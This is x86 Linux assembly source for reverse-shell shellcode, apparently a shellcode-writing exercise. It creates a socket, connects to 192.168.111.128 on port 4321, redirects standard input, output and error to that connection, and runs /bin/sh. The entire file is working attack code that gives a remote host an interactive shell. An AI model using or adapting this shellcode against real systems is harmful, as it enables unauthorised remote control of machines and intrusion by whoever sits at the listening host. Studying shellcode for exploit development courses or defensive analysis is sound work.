global _start

section .text

_start:
xor eax,eax    
xor ebx,ebx    
xor edx,edx    

;server=socket(2,1,0)
push  eax      ; 3rd Arg = 0
push  byte 0x1 ; 2nd Arg = 1
push  byte 0x2 ; 1st Arg = 2
mov   ecx,esp  ; as we mention pointer to arguments
inc   bl       ; SYS_SOCKET 1
xor eax, eax
mov   al,102    ; call socketcall 
int   0x80      
mov   esi,eax   ; store the return value (eax) into esi (server)

;the next block replaces the bind, listen, and accept calls with connect 
;client=connect(server,(struct sockaddr *)&serv_addr,0x10)
push  edx              ; zero 
push  long 0x886FA8C0  ; IP 192.168.111.128
push  word 0xE110      ; Port 4321 
xor   ecx, ecx         
mov   cl,2            ; family 'IP'
push  word cx;         ; build struct, use port,sin.family:0002 four bytes 
mov   ecx,esp          ; move addr struct (on stack) to ecx 
push  byte  0x10       ;  
push  ecx              ; save address of struct back on stack 
push  esi              ; save server from previous
mov   ecx,esp          ; pointer to arguments
mov   bl,3  ; SYS_CONNECT 3 
mov   al,102  
int   0x80  


; prepare for dup2 commands, need client file handle saved in ebx
mov   ebx,esi          ; copied returned file descriptor of client to ebx
xor eax, eax

;dup2(client, 0)
xor   ecx,ecx          
mov   al,63           
int   0x80             

;dup2(client, 1)
inc   ecx              
mov   al,63            
int   0x80            

;dup2(client, 2)
inc   ecx              
mov   al,63           
int   0x80

; standard execve("/bin/sh"...)
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
push   edx
mov    edx, esp
push   ebx
mov    ecx, esp
mov    al, 11
int    0x80

